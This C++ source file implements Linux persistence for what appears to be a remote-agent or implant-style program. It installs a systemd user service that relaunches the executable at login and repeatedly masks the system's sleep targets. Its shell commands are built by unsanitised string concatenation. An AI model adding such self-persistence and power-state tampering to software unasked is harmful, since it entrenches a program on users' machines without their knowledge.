#include "infrastructure/system/LinuxPersistence.hpp"

#include <chrono>
#include <csignal>
#include <cstdlib>
#include <fstream>
#include <sstream>

namespace nuub::infrastructure::system {

static LinuxPersistence* g_instance = nullptr;

LinuxPersistence::LinuxPersistence(std::string pc_id, std::string auto_start_name)
    : pc_id_(std::move(pc_id))
    , auto_start_name_(std::move(auto_start_name)) {}

void LinuxPersistence::configure_auto_start() {
    // Create systemd user service
    std::string home = getenv("HOME") ? getenv("HOME") : "/tmp";
    std::string service_dir = home + "/.config/systemd/user";
    std::string service_file = service_dir + "/" + auto_start_name_ + ".service";

    // mkdir -p
    std::string mkdir_cmd = "mkdir -p " + service_dir;
    system(mkdir_cmd.c_str());

    char exe_path[4096]{};
    ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
    if (len <= 0) return;
    exe_path[len] = '\0';

    std::ofstream file(service_file);
    if (!file.is_open()) return;

    file << "[Unit]\n"
         << "Description=" << auto_start_name_ << "\n"
         << "After=network.target\n\n"
         << "[Service]\n"
         << "Type=simple\n"
         << "ExecStart=" << exe_path << "\n"
         << "Restart=on-failure\n\n"
         << "[Install]\n"
         << "WantedBy=default.target\n";
    file.close();

    // Enable the service
    std::string enable_cmd = "systemctl --user enable " + auto_start_name_ + ".service 2>/dev/null";
    system(enable_cmd.c_str());
}

void LinuxPersistence::hide_console() {
    // On Linux, no console to hide (headless by default)
}

void LinuxPersistence::start_anti_sleep() {
    anti_sleep_running_ = true;
    anti_sleep_thread_ = std::thread(&LinuxPersistence::anti_sleep_loop, this);
}

void LinuxPersistence::stop_anti_sleep() {
    anti_sleep_running_ = false;
    if (anti_sleep_thread_.joinable()) {
        anti_sleep_thread_.join();
    }
}

void LinuxPersistence::anti_sleep_loop() {
    while (anti_sleep_running_) {
        // Prevent system from sleeping via systemd-logind if available
        system("systemctl mask sleep.target suspend.target hibernate.target 2>/dev/null");
        std::this_thread::sleep_for(std::chrono::seconds(60));
    }
}

void LinuxPersistence::create_hidden_window(std::function<void()> on_shutdown) {
    on_shutdown_ = std::move(on_shutdown);
    g_instance = this;

    // Set up signal handlers for clean shutdown
    struct sigaction sa{};
    sa.sa_handler = [](int) {
        if (g_instance && g_instance->on_shutdown_) {
            g_instance->on_shutdown_();
        }
    };
    sigemptyset(&sa.sa_mask);
    sigaction(SIGTERM, &sa, nullptr);
    sigaction(SIGINT, &sa, nullptr);
}

void LinuxPersistence::pump_messages() {
    // Block until signal received
    sigset_t mask;
    sigemptyset(&mask);
    sigaddset(&mask, SIGTERM);
    sigaddset(&mask, SIGINT);
    sigprocmask(SIG_BLOCK, &mask, nullptr);

    int sig;
    sigwait(&mask, &sig);

    if (on_shutdown_) on_shutdown_();
}

} // namespace nuub::infrastructure::system
